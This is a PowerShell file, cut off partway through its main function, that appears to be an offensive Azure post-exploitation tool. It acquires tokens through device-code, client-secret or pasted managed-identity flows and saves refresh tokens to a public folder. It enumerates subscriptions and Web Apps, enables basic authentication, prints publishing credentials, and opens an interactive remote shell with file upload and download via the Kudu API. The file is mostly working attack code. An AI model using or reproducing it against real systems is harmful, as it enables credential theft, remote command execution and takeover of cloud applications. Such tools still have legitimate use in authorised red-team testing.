Function Invoke-WebAppShell {
    param (
        [string]$AccessToken,
        [string]$ClientID,
        [string]$ClientSecret,
        [string]$Identity,
        [string]$TenantName
    )


#####################################################################################
#####################################################################################
    $global:AuthMethod = $null   # "ClientCredentials" | "RefreshToken" | "Manual"
    $global:CID = $null
    $global:CSecret = $null
    $global:TenantID = $null
    $global:AccessToken = $null
####################################################################################
####################################################################################


#######################################################################################################
function Get-AuthHeaders {

    if (-not $global:AccessToken) {
        throw "[-] No AccessToken available. Run Invoke-GetTokens first."
    }

    return @{
        "Authorization"= "Bearer $($global:AccessToken)"
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        "Host" = "management.azure.com"
    }
}

#######################################################################################################

function Invoke-AzureRest {
    param(
        [string]$Method = "GET",
        [string]$Uri,
        [hashtable]$Headers,
        [string]$Body = $null,
        [string]$ContentType = "application/json"
    )
    try {
        $params = @{
            Method = $Method
            Uri = $Uri
            Headers = $Headers
        }
        if ($Body) {
            $params.Body = $Body
            $params.ContentType = $ContentType
        }
        return Invoke-RestMethod @params
    }
    catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        Write-Host "  [!] API Error ($statusCode): $($_.Exception.Message)" -ForegroundColor Yellow
        return $null
    }
}

#######################################################################################################

function Invoke-RenewToken {

    Write-Host "`t[!] Token expired - renewing ($($global:AuthMethod))..." -ForegroundColor Yellow
 
    switch ($global:AuthMethod) {
 
        "ClientCredentials" {
            if (-not $global:CID -or -not $global:CSecret -or -not $global:TenantID) {
                throw "[-] Missing ClientID/ClientSecret/TenantID for token renewal."
            }
 
            $url = "https://login.microsoftonline.com/$($global:TenantID)/oauth2/v2.0/token"
            $body = @{
                "client_id" = $global:CID
                "client_secret" = $global:CSecret
                "scope" = "https://management.azure.com/.default"
                "grant_type" = "client_credentials"
            }
 
            try {
                $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
                $global:AccessToken = $resp.access_token
                Write-Host "`t[+] Token renewed (ClientCredentials)" -ForegroundColor Green
                return $global:AccessToken
            }
            catch {
                throw "[-] Failed to renew token with ClientCredentials: $_"
            }
        }
 
        "RefreshToken" {
            $refreshPath = "C:\Users\Public\RefreshToken.txt"
            if (-not (Test-Path $refreshPath)) {
                throw "[-] No RefreshToken file found at $refreshPath"
            }
 
            $RefreshToken = Get-Content $refreshPath
 
            $url = "https://login.microsoftonline.com/$($global:TenantID)/oauth2/v2.0/token"
            $body = @{
                "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                "scope" = "https://management.azure.com/.default"
                "grant_type" = "refresh_token"
                "refresh_token" = $RefreshToken
            }
 
            try {
                $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
 
                # Save the new refresh token for next time
                if ($resp.refresh_token) {
                    Set-Content -Path $refreshPath -Value $resp.refresh_token
                    Write-Host "`t[>] New RefreshToken saved" -ForegroundColor DarkGray
                }
 
                $global:AccessToken = $resp.access_token
                Write-Host "`t[+] Token renewed (RefreshToken)" -ForegroundColor Green
                return $global:AccessToken
            }
            catch {
                throw "[-] Failed to renew token with RefreshToken: $_"
            }
        }
 
        "Manual" {
            Write-Host "`n`t[!] Cannot auto-renew token for Managed Identity." -ForegroundColor Yellow
            Write-Host "`t[?] Please paste a new AccessToken below:" -ForegroundColor Cyan
            $newToken = Read-Host "`tAccessToken"
 
            if ([string]::IsNullOrWhiteSpace($newToken)) {
                throw "[-] No token provided. Cannot continue."
            }
 
            $global:AccessToken = $newToken.Trim()
            Write-Host "`t[+] Token updated (Manual)" -ForegroundColor Green
            return $global:AccessToken
        }
 
        default {
            throw "[-] Unknown AuthMethod '$($global:AuthMethod)'. Cannot renew token."
        }
    }
}

#######################################################################################################
#######################################################################################################

 
function Invoke-SmartRequest {
    param (
        [string]$Method,
        [string]$Uri,
        [hashtable]$Headers,
        $Body = $null,
        [string]$ContentType = $null,
        [int]$MaxRetries = 15
    )
    
    #write-host $Headers

    if (-not $Headers) {
        $Headers = Get-AuthHeaders
        
    }
 
    $RetryCount = 0
    $TokenRenewed  = $false
    $Success = $false
    $Response  = $null
 
    while (-not $Success -and $RetryCount -lt $MaxRetries) {
        try {
            $p = @{
                Method  = $Method
                Uri     = $Uri
                Headers = $Headers
            }
 
            if ($null -ne $Body) {
                $p['Body'] = $Body
            }
            if ($ContentType) {
                $p['ContentType'] = $ContentType
            }
 
            $Response = Invoke-RestMethod @p
            $Success  = $true
        }
        catch {
            $err  = $_
            $code = if ($err.Exception.Response) {
                        [int]$err.Exception.Response.StatusCode
                    } else {
                        $null
                    }
 
            if ($code -eq 429) {
                $RetryCount++
                $ra   = $err.Exception.Response.Headers["Retry-After"]
                $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) {
                            [int]($ra -join '')
                        } else {
                            0
                        }
                if ($wait -eq 0) { $wait = 10 * $RetryCount }
 
                Write-Host "`t[!] 429 Rate Limit - waiting $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Gray
                Start-Sleep -Seconds $wait
            }
 
            elseif ($code -eq 401) {
 
                if ($TokenRenewed) {
                    throw "[-] 401 after token renewal. Check permissions or credentials."
                }
 
                try {
                    Invoke-RenewToken | Out-Null
 
                    $Headers["Authorization"] = "Bearer $($global:AccessToken)"
                    $TokenRenewed = $true
 
                    Write-Host "`t[>] Retrying request with new token..." -ForegroundColor Cyan
                }
                catch {
                    throw "[-] Token renewal failed: $_"
                }
            }
 
            elseif ($code -eq 403) {
                Write-Host "`t[!] 403 Forbidden - $Uri" -ForegroundColor Red
                throw "[-] Access denied (403). Missing required permissions."
            }
 

            elseif ($code -eq 404) {
                return $null
            }
 
            elseif ($null -eq $code -or $code -ge 500) {
                $RetryCount++
                $wait = 5 * $RetryCount
                Write-Host "`t[!] Error ($code). Retrying in $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Yellow
                Start-Sleep -Seconds $wait
            }
 
            else {
                throw $err
            }
        }
    }
 
    if (-not $Success) {
        throw "[-] Request to $Uri failed after $MaxRetries retries."
    }
 
    return $Response
}

#######################################################################################################
#######################################################################################################
#######################################################################################################

    function Get-DomainName {
        param (
            [string]$DomainName
        )

        try {
            $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
            $TenantID = ($response.issuer -split "/")[3]
            Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
            Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
            return $TenantID
        } catch {
            Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
            return $null
        }
    }

#######################################################################################################

    function Invoke-GetTokens {
        param(
            [string]$DomainName,
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$AccessToken
        )
    
        if ($AccessToken) {
            $global:AuthMethod  = "Manual"
            $global:AccessToken = $AccessToken
            Write-Host "[+] Token set (Manual - Managed Identity)" -ForegroundColor Green
            Write-Host "[!] Auto-renewal not available - you will be prompted on 401" -ForegroundColor DarkGray
            return $global:AccessToken
        }
    
        # Resolve Tenant ID
        if ($DomainName) {
            $global:TenantID = Get-DomainName -DomainName $DomainName
            if (-not $global:TenantID) { return $null }
        }
    
        if ($ClientID -and $ClientSecret) {
    
            $global:AuthMethod = "ClientCredentials"
            $global:CID        = $ClientID
            $global:CSecret    = $ClientSecret
    
            $url = "https://login.microsoftonline.com/$($global:TenantID)/oauth2/v2.0/token"
            $body = @{
                "client_id" = $ClientID
                "client_secret" = $ClientSecret
                "scope" = "https://management.azure.com/.default"
                "grant_type" = "client_credentials"
            }
    
            try {
                $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
                $global:AccessToken = $resp.access_token
                Write-Host "[+] Token acquired (ClientCredentials)" -ForegroundColor Green
                return $global:AccessToken
            }
            catch {
                Write-Error "[-] Failed to get token with ClientCredentials: $_"
                return $null
            }
        }
    
        $global:AuthMethod = "RefreshToken"
    
        $deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
        $Body = @{
            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "resource" = "https://management.azure.com"
        }
    
        $authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $Body
        $code = $authResponse.user_code
        $deviceCode = $authResponse.device_code
    
        Write-Host "`n[#] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
        Write-Host " $code" -ForegroundColor DarkGray
        Start-Sleep -Seconds 5
        Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"
    
        $tokenUrl  = "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0"
        $tokenBody = @{
            "scope" = "openid"
            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" = $deviceCode
        }
    
        while ($true) {
            try {
                $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $tokenBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
    
                if ($tokenResponse.refresh_token) {
                    Set-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $tokenResponse.refresh_token
                    Write-Host "[>] Refresh Token saved to C:\Users\Public\RefreshToken.txt" -ForegroundColor DarkGray
                }
    
                $global:AccessToken = $tokenResponse.access_token
                Write-Host "[+] Token acquired (DeviceCode)" -ForegroundColor Green
                return $global:AccessToken
            }
            catch {
                $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
                if ($errorResponse.error -eq "authorization_pending") {
                    Start-Sleep -Seconds 5
                } elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
                    Write-Host "`n[-] Authorization failed or expired." -ForegroundColor DarkRed
                    return $null
                } else {
                    Write-Host "`n[-] Unexpected error: $($errorResponse.error)" -ForegroundColor DarkRed
                    return $null
                }
            }
        }
    }


#######################################################################################################

    

#######################################################################################################

    function Get-Subscriptions {
        param(
            [hashtable]$Headers
        )

        Write-Host "`n[*] Mapping Subs:" -ForegroundColor Cyan

        $resp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $Headers -Method GET

        if (-not $resp -or -not $resp.value) {
            Write-Host "[!] No subscriptions found or access denied." -ForegroundColor Red
            return @()
        }
        $subs = $resp.value | ForEach-Object {
            [PSCustomObject]@{
                SubscriptionId  = $_.subscriptionId
                SubscriptionName = $_.displayName
                State  = $_.state
            }
        }
        Write-Host "[+] Found $($subs.Count) subscription(s)" -ForegroundColor Green
        foreach ($s in $subs) {
            Write-Host "    - $($s.SubscriptionName) ($($s.SubscriptionId)) [$($s.State)]" -ForegroundColor Gray
        }
        return $subs
    }

#######################################################################################################
#######################################################################################################

    function Get-AllWebApps {
        param(
            [array]$Subscriptions,
            [hashtable]$Headers
        )

        Write-Host "`n[*] Enumerating Web Apps across all subscriptions..." -ForegroundColor Cyan
        $allApps = @()

        foreach ($sub in $Subscriptions) {
            if ($sub.State -ne "Enabled") { continue }

            $subId   = $sub.SubscriptionId
            $subName = $sub.SubscriptionName

            $uri  = "https://management.azure.com/subscriptions/$subId/resources?`$filter=resourceType eq 'Microsoft.Web/Sites'&api-version=2016-09-01"
            $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET

            if (-not $resp -or -not $resp.value) { continue }

            foreach ($app in $resp.value) {
                $rgMatch = $app.id -match "/resourceGroups/([^/]+)/"
                $rg = if ($rgMatch) { $Matches[1] } else { "Unknown" }

                $detailUri = "https://management.azure.com/subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.Web/sites/$($app.name)?api-version=2021-01-15"
                $detail = Invoke-SmartRequest -Uri $detailUri -Headers $Headers -Method GET

                $scmHost = ""
                if ($detail -and $detail.properties -and $detail.properties.enabledHostNames) {
                    $scmHost = $detail.properties.enabledHostNames | Where-Object { $_ -match "\.scm\." } | Select-Object -First 1
                }
                if (-not $scmHost -and $detail -and $detail.properties -and $detail.properties.hostNameSslStates) {
                    $scmEntry = $detail.properties.hostNameSslStates | Where-Object { $_.hostType -eq 1 -or $_.name -match "\.scm\." } | Select-Object -First 1
                    if ($scmEntry) { $scmHost = $scmEntry.name }
                }
                # Last fallback
                if (-not $scmHost) { $scmHost = "$($app.name).scm.azurewebsites.net" }

                $defaultHostName = if ($detail -and $detail.properties -and $detail.properties.defaultHostName) {
                    $detail.properties.defaultHostName
                } else { "$($app.name).azurewebsites.net" }

                Write-Host "    [+] $($app.name) -> SCM: $scmHost" -ForegroundColor Gray

                $allApps += [PSCustomObject]@{
                    Name = $app.name
                    ResourceGroup  = $rg
                    SubscriptionId  = $subId
                    SubscriptionName = $subName
                    OS  = $app.kind
                    Location = $app.location
                    ResourceId = $app.id
                    ScmHost = $scmHost
                    DefaultHostName = $defaultHostName
                    Permission = "Checking..."
                }
            }
        }

        Write-Host "[+] Found $($allApps.Count) Web App(s) total" -ForegroundColor Green
        return $allApps
    }


###########################################################################################################################################

    function Check-Permissions {
        param(
            [array]$WebApps,
            [hashtable]$Headers
        )

        Write-Host "`n[*] Checking permissions on each Web App..." -ForegroundColor Cyan

        foreach ($app in $WebApps) {
            $uri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET

            if ($resp -and $resp.value) {
                $actions = ($resp.value | ForEach-Object { $_.actions }) -join ","
                $notActions = ($resp.value | ForEach-Object { $_.notActions }) -join ","

                if ($actions -match "\*") {
                    $app.Permission = "Owner/Contributor (Full)"
                }
                elseif ($actions -match "Microsoft\.Web/sites/publish" -or $actions -match "Microsoft\.Web/sites/config") {
                    $app.Permission = "Website Contributor"
                }
                else {
                    $app.Permission = "Reader/Limited"
                }

                $credUri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/config/publishingcredentials/list?api-version=2023-12-01"
                $credResp = Invoke-SmartRequest -Method "POST" -Uri $credUri -Headers $Headers
                if ($credResp -and $credResp.properties) {
                    $app.Permission += " [PublishCreds: YES]"
                }
                else {
                    $app.Permission += " [PublishCreds: NO]"
                }
            }
            else {
                $app.Permission = "No Access / Denied"
            }
        }
        return $WebApps
    }


###########################################################################################################################################

    function Show-WebAppMenu {
        param([array]$WebApps)

        Write-Host "`n" -NoNewline
        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
        Write-Host "# Id  # Name                   # OS           # Subscription           # Resource Group      # Permission" -ForegroundColor White
        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan

        for ($i = 0; $i -lt $WebApps.Count; $i++) {
            $app = $WebApps[$i]
            $num = ($i + 1).ToString().PadRight(4)
            $name = $app.Name.PadRight(22).Substring(0, 22)
            $os = $app.OS.PadRight(12).Substring(0, 12)
            $sub = $app.SubscriptionName.PadRight(22).Substring(0, 22)
            $rg = $app.ResourceGroup.PadRight(19).Substring(0, 19)
            $perm = $app.Permission

            $color = if ($perm -match "PublishCreds: YES") {
                        "Green" 
                    }
                    elseif ($perm -match "No Access") {
                        "Red"
                    }
                    else { 
                        "Yellow" 
                    }

            Write-Host " $num # $name # $os # $sub # $rg # " -NoNewline -ForegroundColor Gray
            Write-Host "$perm" -ForegroundColor $color
        }

        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
        Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
        Write-Host " [0] Refresh  |  [Q] Quit" -ForegroundColor DarkYellow
        Write-Host ""
    }


###########################################################################################################################################
    function Set-BasicAuth {
        param(
            [PSCustomObject]$App,
            [hashtable]$Headers,
            [bool]$Enable
        )

        $state = if ($Enable) { "Enabling" } else { "Disabling" }
        $allow = if ($Enable) { $true } else { $false }
        Write-Host "  [*] $state Basic Auth (FTP + SCM)..." -ForegroundColor Cyan

        $body    = @{ properties = @{ allow = $allow } } | ConvertTo-Json
        $baseUri = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"

        $ftpUri = "$baseUri/basicPublishingCredentialsPolicies/ftp?api-version=2023-12-01"
        $scmUri = "$baseUri/basicPublishingCredentialsPolicies/scm?api-version=2023-12-01"

        Invoke-AzureRest -Method "PUT" -Uri $ftpUri -Headers $Headers -Body $body | Out-Null
        Invoke-AzureRest -Method "PUT" -Uri $scmUri -Headers $Headers -Body $body | Out-Null

        $result = if ($Enable) { "enabled" } else { "disabled" }
        Write-Host "  [+] Basic Auth $result" -ForegroundColor Green
    }


###########################################################################################################################################
    function Get-PublishingCredentials {
        param(
            [PSCustomObject]$App,
            [hashtable]$Headers
        )

        Write-Host "  [*] Extracting publishing credentials..." -ForegroundColor Cyan
        $uri  = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)/config/publishingcredentials/list?api-version=2023-12-01"
        $resp = Invoke-AzureRest -Method "POST" -Uri $uri -Headers $Headers

        if ($resp -and $resp.properties) {
            $username = $resp.properties.publishingUserName
            $password = $resp.properties.publishingPassword
            Write-Host "  [+] Username: $username" -ForegroundColor Green
            Write-Host "  [+] Password: $password" -ForegroundColor Green
            return @{ Username = $username; Password = $password }
        }
        else {
            Write-Host "  [!] Failed to retrieve credentials" -ForegroundColor Red
            return $null
        }
    }


###########################################################################################################################################

    function Normalize-VfsPath {
        param(
            [string]$InputPath,
            [string]$VfsWorkDir = "site/wwwroot"
        )

        $p = $InputPath.Trim()

        # Convert backslashes to forward slashes (Windows paths)
        $p = $p -replace "\\", "/"

        # Strip drive letter prefix (D:/home/, C:/home/)
        $p = $p -replace "^[A-Za-z]:/home/", ""

        # Strip absolute /home/ prefix (user types Linux full path)
        $p = $p -replace "^/home/", ""

        # Strip leading slash
        $p = $p -replace "^/", ""

        $knownRoots = "^(site/|LogFiles/|data/|SiteExtensions/|devtools/|\.)"
        if ($p -notmatch $knownRoots) {
            $p = "$($VfsWorkDir.TrimEnd('/'))/$p"
        }

        return $p
    }

###########################################################################################################################################
    function Invoke-KuduDownload {
        param(
            [string]$ScmHost,
            [hashtable]$AuthHeader,
            [string]$RemotePath,
            [string]$LocalPath
        )

        # Normalize: VFS expects path relative to home root
        $vfsPath = Normalize-VfsPath $RemotePath
        $uri = "https://$ScmHost/api/vfs/$vfsPath"

        Write-Host "  [*] Downloading: $uri" -ForegroundColor Cyan
        Write-Host "  [*] Saving to:   $LocalPath" -ForegroundColor Cyan

        try {
            Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -OutFile $LocalPath -ErrorAction Stop
            $size = (Get-Item $LocalPath).Length
            $sizeStr = if ($size -gt 1MB) { "{0:N2} MB" -f ($size / 1MB) }
                    elseif ($size -gt 1KB) { "{0:N2} KB" -f ($size / 1KB) }
                    else { "$size bytes" }
            Write-Host "  [+] Downloaded successfully ($sizeStr)" -ForegroundColor Green
        }
        catch {
            $code = $_.Exception.Response.StatusCode.value__
            if ($code -eq 404) {
                Write-Host "  [!] File not found on remote: $RemotePath" -ForegroundColor Red
            }
            else {
                Write-Host "  [!] Download failed ($code): $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }

###########################################################################################################################################
    function Invoke-KuduUpload {
        param(
            [string]$ScmHost,
            [hashtable]$AuthHeader,
            [string]$LocalPath,
            [string]$RemotePath
        )

        if (-not (Test-Path $LocalPath)) {
            Write-Host "  [!] Local file not found: $LocalPath" -ForegroundColor Red
            return
        }

        $vfsPath = Normalize-VfsPath $RemotePath
        $uri = "https://$ScmHost/api/vfs/$vfsPath"

        $fileBytes   = [System.IO.File]::ReadAllBytes($LocalPath)
        $size = $fileBytes.Length
        $sizeStr = if ($size -gt 1MB) { 
            "{0:N2} MB" -f ($size / 1MB)
        }
        elseif ($size -gt 1KB) {
            "{0:N2} KB" -f ($size / 1KB) 
        }
        else {
            "$size bytes"
        }

        Write-Host "  [*] Uploading: $LocalPath ($sizeStr)" -ForegroundColor Cyan
        Write-Host "  [*] Target:    $uri" -ForegroundColor Cyan

        try {

            $uploadHeaders = $AuthHeader.Clone()
            $uploadHeaders["If-Match"] = "*"

            Invoke-RestMethod -Uri $uri -Method Put -Headers $uploadHeaders -Body $fileBytes -ContentType "application/octet-stream" -ErrorAction Stop
            Write-Host "  [+] Uploaded successfully" -ForegroundColor Green
        }
        catch {
            $code = $_.Exception.Response.StatusCode.value__
            Write-Host "  [!] Upload failed ($code): $($_.Exception.Message)" -ForegroundColor Red
        }
    }

###########################################################################################################################################
    function Invoke-KuduLs {
        param(
            [string]$ScmHost,
            [hashtable]$AuthHeader,
            [string]$RemotePath
        )

        # VFS directory listing requires a trailing slash
        $vfsPath = (Normalize-VfsPath $RemotePath).TrimEnd("/") + "/"
        $uri = "https://$ScmHost/api/vfs/$vfsPath"

        try {
            $items = Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -ErrorAction Stop

            if (-not $items -or $items.Count -eq 0) {
                Write-Host "  (empty directory)" -ForegroundColor Gray
                return
            }

            Write-Host ""
            Write-Host "  Type   Size          Modified                 Name" -ForegroundColor DarkCyan
            Write-Host "  ────   ────          ────────                 ────" -ForegroundColor DarkCyan

            foreach ($item in $items) {
                $isDir = if ($item.mime -eq "inode/directory") { "DIR " } else { "FILE" }
                $color = if ($item.mime -eq "inode/directory") { "Cyan" } else { "White" }

                $sizeVal = if ($item.mime -eq "inode/directory") { "-" }
                        elseif ($item.size -gt 1MB) { "{0:N1} MB" -f ($item.size / 1MB) }
                        elseif ($item.size -gt 1KB) { "{0:N1} KB" -f ($item.size / 1KB) }
                        else { "$($item.size) B" }

                $modified = try { ([datetime]$item.mtime).ToString("yyyy-MM-dd HH:mm:ss") } catch { $item.mtime }
                $name = $item.name

                $typeStr = $isDir.PadRight(5)
                $sizeStr = $sizeVal.PadRight(14)
                $modStr  = "$modified".PadRight(25)

                Write-Host "  $typeStr $sizeStr $modStr " -NoNewline -ForegroundColor Gray
                Write-Host "$name" -ForegroundColor $color
            }
            Write-Host ""
        }
        catch {
            $code = $_.Exception.Response.StatusCode.value__
            if ($code -eq 404) {
                Write-Host "  [!] Directory not found: $RemotePath" -ForegroundColor Red
            }
            else {
                Write-Host "  [!] Listing failed ($code): $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }

###########################################################################################################################################
    function Start-InteractiveShell {
        param(
            [PSCustomObject]$App,
            [hashtable]$Creds
        )

        $scmHost = $App.ScmHost
        $cmdUri = "https://$scmHost/api/command"

        Write-Host "  [*] SCM Endpoint: $scmHost" -ForegroundColor DarkGray

        $pair = "$($Creds.Username):$($Creds.Password)"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
        $b64 = [Convert]::ToBase64String($bytes)
        $authHeader = @{ 
            "Authorization" = "Basic $b64" 
            "User-Agent" =  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
            }

        $isLinux = $App.OS -match "linux"
        $workDir = if ($isLinux) { "/home/site/wwwroot" } else { "site\\wwwroot" }


        try {
            while ($true) {
                Write-Host "  [$($App.Name)] " -ForegroundColor Red -NoNewline
                $command = Read-Host -Prompt ">>"

                if ([string]::IsNullOrWhiteSpace($command)) { continue }
                if ($command -match "^(exit|quit)$") { break }

                if ($command -match "^upload\s+(.+?)\s+(.+)$") {
                    $localPath  = $Matches[1].Trim('"', "'")
                    $remotePath = $Matches[2].Trim('"', "'")
                    Invoke-KuduUpload -ScmHost $scmHost -AuthHeader $authHeader -LocalPath $localPath -RemotePath $remotePath
                    continue
                }

                if ($command -match "^download\s+(.+?)\s+(.+)$") {
                    $remotePath = $Matches[1].Trim('"', "'")
                    $localPath  = $Matches[2].Trim('"', "'")
                    Invoke-KuduDownload -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath -LocalPath $localPath
                    continue
                }

                if ($command -match "^vfs-ls\s*(.*)$") {
                    $remotePath = $Matches[1].Trim('"', "'")
                    if ([string]::IsNullOrWhiteSpace($remotePath)) {
                        $remotePath = "site/wwwroot"
                    }
                    Invoke-KuduLs -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath
                    continue
                }

                if ($isLinux) {
                    $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command))
                    $commandBody = '{"command":"bash -c \"echo ' + $b64 + ' | base64 -d | bash\"","dir":"' + $workDir + '"}'
                }
                else {
                   $commandBody = @{
                    command = $command
                    dir = $workDir
                    } | ConvertTo-Json
                }


                try {
                    $response = Invoke-RestMethod -Uri $cmdUri -Method Post -Body $commandBody -ContentType "application/json" -Headers $authHeader -ErrorAction Stop

                    if ($response.Output) {
                        Write-Host $response.Output -ForegroundColor White
                    }
                    if ($response.Error) {
                        Write-Host $response.Error -ForegroundColor Red
                    }
                    if ($response.ExitCode -ne 0) {
                        Write-Host "  [Exit Code: $($response.ExitCode)]" -ForegroundColor Yellow
                    }
                }
                catch {
                    Write-Host "  [!] Command failed: $($_.Exception.Message)" -ForegroundColor Yellow
                }
            }
        }
        catch {
            # Ctrl+C caught
        }
    }

###################################################################################

function Get-BasicAuthStatus {
    param(
        [PSCustomObject]$App,
        [hashtable]$Headers
    )
    Write-Host "  [WinDebuigDeubgDeubg] Sub=$($App.SubscriptionId) RG=$($App.ResourceGroup) Name=$($App.Name)" -ForegroundColor gray

    $baseUri = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"
    $scmUri = "$baseUri/basicPublishingCredentialsPolicies/scm?api-version=2023-12-01"

    try {
        $resp = Invoke-AzureRest -Method "GET" -Uri $scmUri -Headers $Headers
        if ($resp -and $resp.properties) {
            return [bool]$resp.properties.allow
        }
    } catch { }
    return $false
}
###################################################################################

    function main {
        param (
            [string]$AccessToken,
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$Identity,
            [string]$TenantName
        )
    
        if (-not $TenantName) {
            Write-Host "[-] Must specify TenantName" -ForegroundColor Red
            return
        }
    
        # Resolve tenant
        $global:TenantID = Get-DomainName -DomainName $TenantName
        if (-not $global:TenantID) {
            Write-Host "[-] Could not resolve TenantID. Exiting." -ForegroundColor Red
            return
        }
    

        if ($Identity) {
            # Managed Identity - manual token
            Invoke-GetTokens -AccessToken $Identity | Out-Null
        }
        elseif ($ClientID -and $ClientSecret) {
            # Service Principal
            Invoke-GetTokens -DomainName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret | Out-Null
        }
        else {
            # User - Device Code Flow
            Invoke-GetTokens -DomainName $TenantName | Out-Null
        }
    

        if (-not $global:AccessToken) {
            Write-Host "[-] Failed to acquire token. Exiting." -ForegroundColor Red
            return
        }
    
        $headers = Get-AuthHeaders
    
        # Enumerate subscriptions
        $subscriptions = Get-Subscriptions -Headers $headers
        if ($subscriptions.Count -eq 0) {
            Write-Host "[!] No subscriptions accessible. Exiting." -ForegroundColor Red
            return
        }
    

        $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
        if ($webApps.Count -eq 0) {
            Write-Host "[!] No Web Apps found. Exiting." -ForegroundColor Red
            return
        }
    
        # Check permissions
        $webApps = Check-Permissions -WebApps $webApps -Headers $headers
    
        # Interactive loop
        while ($true) {
            Show-WebAppMenu -WebApps $webApps
    
            $choice = Read-Host -Prompt "Select Web App # (or Q to quit)"
        

            if ($choice -match "^[Qq]$") {
                Write-Host "`n[*] Goodbye." -ForegroundColor Cyan
                break
            }
    
            if ($choice -eq "0") {
                Write-Host "`n[*] Refreshing..." -ForegroundColor Cyan
                $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
                $webApps = Check-Permissions -WebApps $webApps -Headers $headers
                continue
            }
    
            $index = [int]$choice - 1
            if ($index -lt 0 -or $index -ge $webApps.Count) {
                Write-Host "[!] Invalid selection." -ForegroundColor Red
                continue
            }
    
            $selectedApp = $webApps[$index]
            Write-Host "`n[*] Selected: $($selectedApp.Name) [$($selectedApp.ResourceGroup)]" -ForegroundColor Cyan
    
            if ($selectedApp.Permission -match "No Access") {
                Write-Host "[!] Insufficient permissions on this Web App." -ForegroundColor Red
                continue
            }
    
            # Enable basic auth
            #Set-BasicAuth -App $selectedApp -Headers $headers -Enable $true
            $wasBasicAuthEnabled = Get-BasicAuthStatus -App $selectedApp -Headers $headers
            if ($wasBasicAuthEnabled) {
                Write-Host "  [*] Basic Auth already enabled" -ForegroundColor Green
            } else {
                Set-BasicAuth -App $selectedApp -Headers $headers -Enable $true
            }
            
            # Get publishing credentials
            $creds = Get-PublishingCredentials -App $selectedApp -Headers $headers
            if (-not $creds) {
                Write-Host "[!] Cannot proceed without credentials. Disabling basic auth..." -ForegroundColor Red
                if (-not $wasBasicAuthEnabled) {
